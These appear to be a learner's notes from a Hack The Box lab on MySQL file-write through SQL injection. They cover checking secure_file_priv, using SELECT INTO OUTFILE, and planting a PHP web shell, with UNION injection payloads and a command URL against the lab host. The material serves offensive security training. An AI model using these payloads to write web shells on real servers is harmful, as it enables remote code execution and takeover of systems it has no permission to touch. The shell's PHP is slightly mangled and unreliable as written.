
When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.

---
## Write File Privileges
To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled <> covered already
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

#### secure_file_priv
>An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege


>`MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings. Even worse, some modern configurations default to `NULL`, meaning that we cannot read/write files anywhere within the system.

enumerate:
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```



---
#### ##**IMPORTANT:**##
>as all variables and most configurations' are stored within the `INFORMATION_SCHEMA` database.

----


```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

our-case:
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

>empty, meaning that we can read/write files to any location.


## SELECT INTO OUTFILE
`SELECT .. INTO OUTFILE` statement
can be used to write data from select queries into files. This is usually used for exporting data from tables.

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```bash
AhmaDb0x@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

>Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

## Writing Files through SQL Injection

Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write `file written successfully!` to the `/var/www/html/proof.txt` file, which we can then access on the web application


---
```bash

**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

```

## Writing a Web Shell
PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:
```bash
<?php $y$tem($_rqst[0]); ?>
```
![[Pasted image 20250329055136.png]]

```bash
cn' union select "",'<?php $y$tem($_rqst[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:
The output of the `id` command confirms that we have code execution and are running as the `www-data` user.


```bash
http://94.237.58.78:43299/shell.php?0=cd%20..;ls;cat%20flag.txt
```

